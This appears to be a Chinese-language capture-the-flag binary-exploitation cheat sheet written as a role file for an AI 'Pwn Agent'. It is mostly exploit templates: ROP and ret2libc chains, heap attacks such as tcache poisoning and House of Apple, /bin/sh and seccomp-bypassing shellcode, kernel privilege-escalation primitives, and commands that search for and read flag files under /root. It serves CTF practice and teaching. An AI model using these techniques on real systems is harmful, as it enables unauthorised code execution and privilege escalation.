# Pwn Agent — 技术速查

> **适用版本**: glibc 2.26-2.39, pwntools 4.0+, Python 3.8+

## Mission
二进制利用：侦察保护、恢复漏洞原语、构建 exploit、获取 flag。

## When Selected
- ELF/PE 二进制 + remote service
- crash/leak/corruption 原语
- libc/loader/gadget 驱动的利用

---

## First Pass

1. `file binary` + `checksec --file=binary` — 架构、保护机制
2. 逆向主逻辑 — 找到 I/O 接口和 crash surface
3. 识别最有潜力的原语：栈溢出、格式化字符串、堆破坏、逻辑读写
4. 判断需要 local/remote/both

---

## 保护机制速查

| 保护 | 绕过 |
|------|------|
| NX/DEP | ROP, ret2libc, mprotect |
| ASLR/PIE | 信息泄露（格式化字符串, partial overwrite） |
| Stack Canary | 泄露 canary（最低字节 `\x00`）, 或 overwrite 前先 leak |
| Full RELRO (glibc ≤2.33) | `__free_hook`/`__malloc_hook` 覆写 |
| Full RELRO (glibc ≥2.34) | hook 已移除，转向 IO_FILE exploit (FSOP)、`_IO_wfile_overflow` vtable、stack pivot、exit_hook |
| SECCOMP | `seccomp-tools dump ./binary` 查规则，orw (open-read-write) 或 bypass |

---

## 核心技术

### 栈溢出
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)

# ret2win
payload = flat(b'A' * offset, rop.find_gadget(['ret'])[0], elf.sym['win'])

# ret2libc
payload = flat(b'A' * offset, pop_rdi, next(elf.search(b'/bin/sh')), elf.plt['system'])
```

### 格式化字符串
```python
# 泄露栈/寄存器值
payload = b'%p.' * 20

# 泄露指定偏移
payload = f'%{offset}$p'.encode()

# 任意地址写（逐字节）
payload = fmtstr_payload(offset, {target_addr: value})
```

### 堆利用

#### glibc 版本适配速查

| glibc 版本 | 新增保护 | 影响 |
|-----------|---------|------|
| ≥2.26 | tcache 引入 | tcache poisoning 可用 |
| ≥2.29 | tcache double-free 检测 (key) | 需清除 tcache key 或用不同大小 |
| ≥2.32 | safe-linking (fd 指针混淆) | fd 需 XOR `(heap_addr >> 12)` |
| ≥2.34 | `__malloc_hook`/`__free_hook` 移除 | 转向 IO_FILE / exit_hook |
| ≥2.35 | 对齐地址检查加强 | fake chunk 必须 16-byte aligned |
| ≥2.37 | `_rtld_global._dl_ns[0]._ns_loaded` 只读 | House of Banana 需绕过只读 link_map |
| ≥2.38 | TLS 偏移变化 | tls_dtor_list 攻击需重新计算偏移 |
| ≥2.39 | - | 关注 glibc 2.40+ 新变化 |

#### 基础堆利用
- **tcache poisoning** (glibc ≥2.26): double free → overwrite fd → 任意分配
- **fastbin attack**: 大小对齐的 fake chunk → __malloc_hook (glibc <2.34)
- **House of** 系列: Force, Spirit, Lore, Orange, etc.
- **LSB overwrite**: 只覆盖低字节绕过 ASLR（概率 1/16）

```python
# tcache poisoning 模板
alloc(0x20, b'A')   # chunk 0
alloc(0x20, b'B')   # chunk 1
free(0)
free(1)             # tcache: 1 → 0
# overwrite chunk 1's fd → target
edit(1, p64(target_addr))
alloc(0x20, b'C')   # gets chunk 0
alloc(0x20, payload) # gets target_addr → 任意写
```

#### safe-linking 绕过 (glibc ≥2.32)
```python
# fd 指针现在被 XOR 混淆: encrypted_fd = fd ^ (chunk_addr >> 12)
# 需要先泄露堆地址

# 方法 1: 泄露堆基址后计算
heap_base = leaked_addr & ~0xfff
encrypted_fd = target_addr ^ (chunk_addr >> 12)
edit(chunk, p64(encrypted_fd))

# 方法 2: 利用第一个 free chunk (fd 指向 NULL)
# encrypted_null = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12
# 从中直接泄露 heap_addr >> 12
```

#### tcache key 绕过 (glibc ≥2.29)
```python
# tcache 在 chunk+0x8 处写入 key 防止 double free
# 绕过方法：
# 1. 清除 key: 溢出/UAF 写入 chunk+0x8 为非 key 值
# 2. 不同 size: free 到不同 tcache bin（size A → size B）
# 3. 填满 tcache (7个) → 进入 fastbin/unsorted → 无 key 检查
```

#### IO_FILE Exploit (glibc ≥2.34 核心技术)
```python
# __malloc_hook/__free_hook 被移除后，IO_FILE 成为主要攻击面
# 核心思路：伪造 _IO_FILE 结构体，劫持 vtable 中的函数指针

# House of Apple 2 — 最常用的现代堆利用终局
# 利用 _IO_wfile_overflow 走 wide-data 路径调用任意函数
# 条件：任意写一个可控地址到 _IO_list_all 或修改现有 FILE

from pwn import *

# 伪造 _IO_FILE 结构体 (House of Apple 2)
fake_io = flat({
    0x0:  0,                     # _flags — 需满足特定条件
    0x20: 0,                     # _IO_write_base
    0x28: 1,                     # _IO_write_ptr (> _IO_write_base)
    0x68: system_addr,           # _lock — 可写地址
    0xa0: wide_data_addr,        # _wide_data → 指向可控区域
    0xd8: _IO_wfile_jumps_addr,  # vtable → _IO_wfile_jumps
    # wide_data 中:
    # wide_data+0x18: 0          # _IO_write_base
    # wide_data+0x30: 0          # _IO_buf_base
    # wide_data+0xe0: fake_vtable_addr  # _wide_vtable
    # fake_vtable+0x68: target_func     # __overflow slot
}, filler=b'\x00')

# 触发: exit() → _IO_flush_all → _IO_wfile_overflow → 调用 wide_vtable.__overflow
```

#### House of Apple / Cat / Kiwi 速查

| House | 核心路径 | 适用条件 |
|-------|---------|---------|
| Apple 2 | `_IO_wfile_overflow` → `_wide_vtable.__overflow` | 最通用，需要 largebin attack 或任意写 |
| Apple 3 | `_IO_wfile_overflow` → `_wide_vtable.__seekoff` | Apple 2 的变体 |
| Cat | `_IO_wfile_overflow` → `_IO_switch_to_wget_mode` → stack pivot | 需要更精确的布局 |
| Kiwi | `_IO_file_setbuf` → `_IO_wfile_sync` | 利用 setbuf 链 |
| Orange | unsorted bin attack → `_IO_list_all` → FSOP | 经典但 glibc ≥2.27 不可用 |

#### Largebin Attack (配合 IO_FILE)
```python
# 向任意地址写入一个堆地址（不可控内容）
# 常用于覆写 _IO_list_all 或 stderr 指针

# 步骤：
# 1. free chunk A (大小 0x420+) → 进入 unsorted bin
# 2. alloc 使 A 进入 large bin
# 3. free chunk B (比 A 稍小) → 进入 unsorted bin
# 4. 修改 A 的 bk_nextsize = target_addr - 0x20
# 5. alloc 触发 → B 插入 large bin → target_addr 被写入堆地址

# 然后在该堆地址处布置 fake _IO_FILE → exit() 触发 FSOP
```

#### tls_dtor_list (glibc ≥2.34 终局技术)
```python
# 原理: exit() → __call_tls_dtors → func(cur->obj)
# tls_dtor_list 在 TLS fs:[-0x58] 处
#
# dtor_list 结构 (0x20 字节):
# +0x00: func (PTR_DEMANGLED: ROR17(func ^ pointer_guard))
# +0x08: obj  (func 的参数)
# +0x10: map  (可为 NULL)
# +0x18: next (须为 NULL)

# 方法 1: system("/bin/sh")
def encrypt(addr, guard):
    return ((addr ^ guard) << 0x11 | (addr ^ guard) >> 0x2f) & 0xffffffffffffffff

payload = p64(encrypt(system_addr, pointer_guard))  # func
payload += p64(binsh_addr)                           # obj (arg1)
payload += p64(0) + p64(0)                           # map, next

# 方法 2: Stack Pivot → ROP (适用于 seccomp ORW)
# func = encrypt(leave_ret, pointer_guard)
# obj 指向 ROP chain → leave;ret 后 rsp = rop_chain
```

### SROP (Sigreturn-Oriented Programming)
```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = flat(b'A' * offset, syscall_ret, bytes(frame))
# 需要 rax=15 (sigreturn) 时用 read 返回值控制
```

### Stack Pivot
```python
# 当溢出字节有限，用 leave; ret 跳到可控缓冲区
# leave = mov rsp, rbp; pop rbp
payload = flat(
    b'A' * (offset - 8),    # 填充到 saved rbp
    buffer_addr,             # new rbp → 可控区域
    leave_ret,               # leave; ret → rsp 跳转
)
# buffer_addr 处预先布置 ROP chain
```

### one_gadget
```bash
# 查找 libc 中的 one-shot gadget
one_gadget libc.so.6
# 输出: 0xXXXXX  execve("/bin/sh", rsp+0x30, environ)
#        constraints: [rsp+0x30] == NULL

# 使用
payload = flat(b'A' * offset, libc_base + one_gadget_offset)
```

### BROP (Blind ROP)
```python
# 无 info leak 时的利用方法 (服务 crash 后重启)
# 前提: binary 无 PIE (或已知代码段地址), 无 canary (或可逐字节爆破)

# 1. 爆破 offset + canary (byte-by-byte)
for b in range(256):
    payload = b'A' * offset + b'X' * (known_canary_len + 1)
    payload += bytes([b])
    # ... 发送, 观察 crash/正常返回 → 确定 canary 字节

# 2. 找 Stop gadget (ret 指令, 不 crash)
# 3. 找 BROP gadget (ret2csu 模式): pop rdi; ret / pop rsi; pop r15; ret
# 4. 扫描 PLT: 调用 write/puts 泄漏内存
# 5. 从返回的字节中 dump binary → 找更多 gadget → 完整 ROP
```

### SECCOMP orw shellcode
```python
# 当 execve 被禁，用 open-read-write 读 flag
from pwn import *
context.arch = 'amd64'

shellcode = shellcraft.open('/flag', 0)      # fd = open("/flag", O_RDONLY)
shellcode += shellcraft.read('rax', 'rsp', 0x100)  # read(fd, rsp, 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)     # write(1, rsp, 0x100)
payload = asm(shellcode)

# 查看 seccomp 规则
# seccomp-tools dump ./binary
```

### Shellcode 约束绕过
```python
# 当 shellcode 有字符限制时 (badchars, 可见字符等)

# 1. pwntools 编码器: shellcraft + encoder
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
encoded = encoder.avoid(b'\x00\x0a\x0d\x20')  # 自动编码避开 badchars

# 2. 自修改解码 stub — 异或/XOR 编码
payload = asm('''    /* 解码器 stub */
    lea rsi, [rip + encoded]
    xor ecx, ecx
decode:
    xor byte ptr [rsi + rcx], 0x42
    inc rcx
    cmp rcx, len
    jl decode
    jmp rsi
encoded:
    /* XOR(0x42) 编码后的真实 shellcode */
''')

# 3. 字母数字 shellcode (可见字符 ASCII)
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.alphanumeric(shellcraft.sh()))
# 检查: all(c in string.printable.encode() for c in shellcode)

# 4. 短 shellcode (缓冲区极小)
# push 0x68732f6e69622f  → /bin/sh (8 字节)
# 或 stage 2 loader: read(0, rsp, 0x100) → 再读入完整 shellcode
```

### ret2dlresolve
```python
# 当 Partial RELRO + 无 leak
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
```

### ret2csu (__libc_csu_init)
```python
# 两段 gadget 控制 rdi/rsi/rdx 并调用函数 (无 pop rdx; ret 时必备)
# Gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# Gadget 2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

csu_pop = 0x401xxa  # 找到 binary 中的地址
csu_call = 0x401xxb

payload = flat(
    b'A' * offset,
    csu_pop,
    0,             # rbx = 0
    1,             # rbp = 1 (循环检查: rbx+1 == rbp)
    edi_val,       # r12 → edi (arg1)
    rsi_val,       # r13 → rsi (arg2)
    rdx_val,       # r14 → rdx (arg3)
    func_got,      # r15 → GOT 条目
    csu_call,
    0,0,0,0,0,0,0, # csu_call 尾部的 pop 恢复
    next_rop,      # 后续 ROP
)
```

---

## libc 版本确认

```bash
# 通过泄露的函数地址查 libc 版本
# 访问 https://libc.rip 或 libc-database.net
# 输入 2-3 个 函数名:最后3位偏移

# pwntools 自动化
libc = ELF('./libc.so.6')
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))
```

### patchelf 本地调试
```bash
# 用题目提供的 libc 本地调试（关键！）
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
patchelf --set-rpath . ./binary
# 或
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary
```

---

## GDB + pwndbg 工作流

```bash
# 启动调试（pwndbg 已安装在 ~/.local/）
gdb -q ./binary
# pwndbg 常用命令：
# checksec           — 保护机制
# vmmap              — 内存映射
# heap               — 堆状态
# bins               — tcache/fastbin/unsorted
# telescope $rsp 20  — 栈内容
# search -s "flag"   — 内存搜索字符串
# cyclic 200         — 生成 pattern 找偏移
# cyclic -l 0x6161616b — 计算偏移

# 配合 pwntools 自动附加
gdb.attach(r, 'b *main+42\nc')
```

### GDB 非交互脚本（AI 友好）
```bash
# AI 无法交互式使用 GDB，用脚本批量执行命令
gdb -q -batch -ex "file ./binary" \
    -ex "b *main" \
    -ex "run < input.txt" \
    -ex "info registers" \
    -ex "x/20gx \$rsp" \
    -ex "bt" \
    -ex "quit"

# 导出反汇编
gdb -q -batch -ex "file ./binary" \
    -ex "disassemble main" \
    -ex "disassemble vuln_func" > disasm.txt

# 堆状态快照
gdb -q -batch -ex "file ./binary" \
    -ex "b *malloc+0" \
    -ex "run < input.txt" \
    -ex "heap" \
    -ex "bins" \
    -ex "quit" 2>&1 | tee heap_state.txt

# pwntools GDB 脚本（非交互，自动输出）
python3 -c "
from pwn import *
context.binary = ELF('./binary')
p = process('./binary')
gdb.attach(p, '''
b *main+42
c
info registers
x/20gx \$rsp
heap
bins
quit
''')
p.sendline(b'AAAA')
p.wait()
" 2>&1 | tee debug_output.txt
```

---

## pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./binary')
# context.log_level = 'debug'

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process(elf.path)

r = conn()

# === Exploit ===
# 1. Leak
r.recvuntil(b'> ')
r.sendline(b'%7$p')
leak = int(r.recvline().strip(), 16)
log.info(f'leak: {hex(leak)}')

# 2. Calculate base
libc_base = leak - OFFSET
log.info(f'libc base: {hex(libc_base)}')

# 3. Payload
payload = flat(
    b'A' * PADDING,
    POP_RDI,
    libc_base + BINSH,
    libc_base + SYSTEM,
)

r.sendline(payload)
r.interactive()
```

---

## WP 记录要点

### 必需信息
```bash
# checksec 输出 — 记录完整保护状态
checksec --file=./binary

# libc / ld 信息
file libc.so.6
strings libc.so.6 | grep 'GNU C Library' | head -1
sha256sum libc.so.6 ld-linux-x86-64.so.2  # 校验版本一致性

# 关键偏移 (WP 中标注计算过程)
# offset = 0x40(buf) + 8(rbp) = 0x48 → 72
# leak = puts(got_puts) → libc_base = leak - puts_off
# system = libc_base + system_off; binsh = libc_base + binsh_off
# one_gadget = libc_base + one_gadget_off
```

### 本地 vs 远程差异排查
```python
# 远程不通的常见原因:
# 1. libc 版本差异 (即使同一发行版也有小版本差异)
# 2. LD_PRELOAD / 环境变量差异
# 3. ASLR 开关 (本地 gdb 默认关 ASLR)
# 4. 网络传输中的 null 字节/换行截断

def conn():
    if args.REMOTE:
        return remote('host', port)
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p)
    return p

# 确保本地使用题目提供的 libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
# patchelf --set-rpath . ./binary
```

**复现模板**: WP 中每步标注命令 → 预期输出 → 发现 → 依据（checksec、偏移计算、libc 版本）

---

## Kernel Pwn 基础

### 判断是否为 Kernel 题
```bash
# 题目提供以下文件之一：
# - bzImage / vmlinux / vmlinuz   (内核镜像)
# - rootfs.cpio / initramfs.cpio  (文件系统)
# - run.sh / boot.sh              (QEMU 启动脚本)
# - *.ko                          (内核模块)
file *
cat run.sh  # 查看 QEMU 参数 (kaslr, smep, smap, kpti)
```

### 内核保护机制
| 保护 | 绕过 |
|------|------|
| KASLR | 泄露内核基址 (dmesg, /proc/kallsyms if readable, side-channel) |
| SMEP | ROP 在内核空间执行，不直接跳到用户空间代码 |
| SMAP | 不能直接访问用户空间数据，需 copy_from_user / 内核 ROP |
| KPTI | 返回用户空间前需 swapgs + KPTI trampoline |

### 常见内核利用原语
```c
// 目标：提权 — commit_creds(prepare_kernel_cred(0))
// 或修改 task_struct 中的 cred 指针

// userfaultfd (旧版内核 <5.11 默认可用)
// 用途：在 copy_from_user/copy_to_user 时暂停内核线程，制造竞态
// 1. mmap 一个页，注册 userfaultfd
// 2. 触发 copy_from_user 到该页 → 内核线程暂停
// 3. 在暂停期间修改内核对象状态
// 4. 释放 uffd → 内核继续 → UAF/race 达成

// msg_msg (通用内核堆喷)
// 大小可控 (48 ~ 页大小)，header 后直接跟用户数据
// msgsnd()/msgrcv() 进行分配和释放
// 常用于堆喷占位、越界读/写

// pipe_buffer (管道缓冲区利用)
// pipe() 创建，每个 pipe_buffer 结构含函数指针表 (pipe_buf_operations)
// 覆写函数指针 → 调用 commit_creds(prepare_kernel_cred(0))
```

### 内核 ROP 返回用户空间
```python
# 内核 ROP 链末尾需要正确返回用户空间
# 保存用户空间状态:
# save_state: mov cs, ss, rflags, rsp, rip 到全局变量
# 恢复: swapgs; iretq (push: rip, cs, rflags, rsp, ss)

# 如果 KPTI 开启，需要经过 KPTI trampoline:
# swapgs_restore_regs_and_return_to_usermode
# 地址从 vmlinux 中搜索
```

---

## AArch64 (ARM64) 利用基础

### 与 x86_64 的关键差异
| 特性 | AArch64 | x86_64 |
|------|---------|--------|
| 返回地址 | x30 (LR), 不自动入栈 | 保存在栈上 |
| 参数传递 | x0-x7 | rdi, rsi, rdx, rcx, r8, r9 |
| 帧指针 | x29 (FP) | rbp |
| Syscall | `mov x8, #num; svc #0` | `syscall` 指令 |
| 常用 gadget | `ldp x29, x30, [sp], #N; ret` | `pop rdi; ret` 等 |

### AArch64 ROP 要点
```python
# 参数寄存器: x0-x7
# 典型 gadget 模式: ldp (load pair) 批量恢复寄存器
# ldp x19, x20, [sp, #0x10]
# ldp x29, x30, [sp], #0x20
# ret

# ret2csu (ARM64 版)
# 通过 __libc_csu_init 中的两段 gadget 控制参数
# 步骤: 1. 控制 x19-x30 → 2. 调用 x17 指向的函数 → 3. 设置 x0-x2

# shellcode syscall
context.arch = 'aarch64'
shellcode = asm('''
    /* execve("/bin/sh", 0, 0) */
    mov x0, #0x              /* NULL terminator for /bin/sh */
    str x0, [sp, #-8]!       /* push 0 onto stack */
    adr x1, binsh
    stp x1, x0, [sp, #-16]! /* argv = {binsh, NULL} */
    mov x0, x1              /* x0 = binsh */
    mov x1, sp              /* x1 = argv */
    mov x2, xzr             /* x2 = NULL (envp) */
    mov x8, #221            /* execve = 221 */
    svc #0
binsh: .asciz "/bin/sh"
''')
```

### ARM64 堆利用
- tcache/safe-linking: 与 x86_64 相同，fd = next ^ (cur >> 12)
- IO_FILE exploit: 结构体布局相同，但函数指针偏移因架构而异
- syscall number: execve=221, open=56, read=63, write=64

---

## Escalation

需要 `reverse-agent` 当：
- 函数恢复阻塞 exploit chain
- 需要去混淆或 patch diff
- loader 或自定义解析器行为不明

---

## Seccomp 沙箱逃逸

### 检测 Seccomp

```bash
# seccomp-tools (Ruby gem)
seccomp-tools dump ./binary
# 输出规则列表: ALLOW/KILL syscall

# 或 pwntools
from pwn import *
print(ELF('./binary').checksec())
# 看到 seccomp: enabled 时需要分析规则
```

### 常见沙箱策略与绕过

| 禁止的 Syscall | 绕过方案 |
|---------------|---------|
| execve | ORW: open+read+write 读 flag |
| execve+open | openat(AT_FDCWD, "/flag", 0) 替代 open |
| execve+open+openat | openat2 (syscall 437) 或 name_to_handle_at+open_by_handle_at |
| read | preadv / preadv2 / process_vm_readv |
| write | writev / pwritev / sendfile(stdout, fd, 0, 0x100) |
| 所有文件操作 | 侧信道: 逐字节猜测 flag, 用 nanosleep/clock_gettime 计时 |
| ARCH==x86_64 | retf 切换到 32-bit mode, 使用 32-bit syscall number 绕过 |
| mprotect 禁 | mmap(MAP_FIXED) 重映射 RWX; memfd_create + file-based mmap |
| open/read/write 全禁 | socket+connect OOB 外泄; mmap 映射 fd 代替 read |

### 替代 Syscall 速查
```python
# 当某类 syscall 被过滤时的替代方案
# open 族:  open → openat(AT_FDCWD, ...) → openat2 → name_to_handle_at+open_by_handle_at
# read 族:  read → pread64 → readv → preadv2 → process_vm_readv
# write 族: write → pwrite64 → writev → pwritev2 → sendfile
# exec 族:  execve → execveat → execvp (非 syscall, libc 函数)
```

### ORW Shellcode (pwntools)

```python
from pwn import *
context.arch = 'amd64'

# 标准 ORW
shellcode = asm('''
    /* open("/flag", O_RDONLY) */
    push 0x67616c66        /* "flag" reversed */
    mov rdi, rsp
    xor esi, esi           /* O_RDONLY */
    push SYS_open
    pop rax
    syscall

    /* read(fd, rsp, 0x100) */
    mov rdi, rax           /* fd from open */
    mov rsi, rsp
    mov rdx, 0x100
    push SYS_read
    pop rax
    syscall

    /* write(1, rsp, 0x100) */
    push 1
    pop rdi
    mov rsi, rsp
    mov rdx, 0x100
    push SYS_write
    pop rax
    syscall
''')

# 或 shellcraft 快速版
shellcode = asm(
    shellcraft.open('/flag') +
    shellcraft.read('rax', 'rsp', 0x100) +
    shellcraft.write(1, 'rsp', 0x100)
)

# openat 版本 (绕过禁 open)
shellcode = asm(
    shellcraft.openat(-100, '/flag', 0) +   # AT_FDCWD = -100
    shellcraft.read('rax', 'rsp', 0x100) +
    shellcraft.write(1, 'rsp', 0x100)
)

# sendfile 版本 (绕过禁 read+write)
shellcode = asm(
    shellcraft.open('/flag') +
    shellcraft.sendfile(1, 'rax', 0, 0x100)
)
```

### 架构切换绕过 (retf)

```python
# seccomp 仅检查 AUDIT_ARCH_X86_64 → 切到 32-bit 绕过
context.arch = 'amd64'
shellcode = asm('''
    /* 切换到 32-bit mode */
    push 0x23              /* CS for 32-bit mode */
    lea eax, [rip + shellcode_32]
    push rax
    retf

shellcode_32:
    .code32
    /* 32-bit open("/flag", 0) — syscall number 5 */
    push 0x67616c66
    mov ebx, esp
    xor ecx, ecx
    mov eax, 5
    int 0x80

    /* 32-bit read(fd, esp, 0x100) */
    mov ebx, eax
    mov ecx, esp
    mov edx, 0x100
    mov eax, 3
    int 0x80

    /* 32-bit write(1, esp, 0x100) */
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x100
    mov eax, 4
    int 0x80
''')
```

### Seccomp + 堆利用组合

```
典型攻击链:
1. 堆利用获得任意写 (tcache poison / House of Apple)
2. 无法 system("/bin/sh") — seccomp 禁了 execve
3. 改写 __free_hook / vtable 到 mprotect gadget
4. mprotect 使某页 RWX
5. 跳转到 RWX 页执行 ORW shellcode
6. 读取 flag 输出

或:
1. House of Apple 2 → 控制 RIP
2. 在 RIP 处放 stack pivot gadget
3. ROP chain: mprotect → shellcode → ORW
```

---

## 提权（后利用）

获取 shell 后寻找 flag：
```bash
find / -name "flag*" 2>/dev/null
cat /flag* /home/*/flag* /root/flag* 2>/dev/null
```

Linux 提权速查见 [knowledge/linux-privesc.md](../knowledge/linux-privesc.md)：
- SUID/SGID binary (GTFObins)
- sudo -l 检查
- Docker group → instant root
- Cron job abuse
- Kernel exploit
